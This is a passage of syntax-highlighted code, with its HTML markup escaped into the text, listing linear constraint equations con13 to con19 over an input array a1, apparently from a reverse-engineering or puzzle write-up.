&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;50871139&lt;/span&gt;
con13 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;208564&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;81934&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;106641&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;198477&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;154505&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;48440&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;149004&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;108909&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;51714&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;296420&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;263021&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;688726&lt;/span&gt;
con14 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;131130&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;224265&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;230702&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;176285&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;274778&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;103848&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;136039&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;241151&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;15542&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;17521&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;41644083&lt;/span&gt;
con15 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;195056&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;15717&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;180214&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;114427&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;277782&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;261379&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;225266&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;107609&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;259792&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;270563&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;205124&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;138334&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;103474&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;117027475&lt;/span&gt;
con16 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;189573&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;64393&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;231137&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;145315&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;53938&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;291345&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;216413&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;204681&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;65519&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;262826&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;187002&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;271732&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;38663722&lt;/span&gt;
con17 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;15645&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;276267&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;31190&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;244002&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;81415&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;22940&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;126076&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8932&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;112153&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;194218&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;197656&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;204463&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;219500&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;19777&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;24531260&lt;/span&gt;
con18 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;279969&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;123977&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;162094&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;215769&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;18878&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;80292&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;237675&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;222121&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;269381&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;153934&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;165380&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;157137&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;186748&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;170756&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;186932&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;87264470&lt;/span&gt;
con19 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;87190&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;74836&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16892&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;185781&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;12726&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;85022&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;232989&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;68516&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;120254&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;204892&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;65901&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;201087&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;158612&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;49445&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;181860&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;111015&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; a1[&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;43646834&lt;/span&gt;
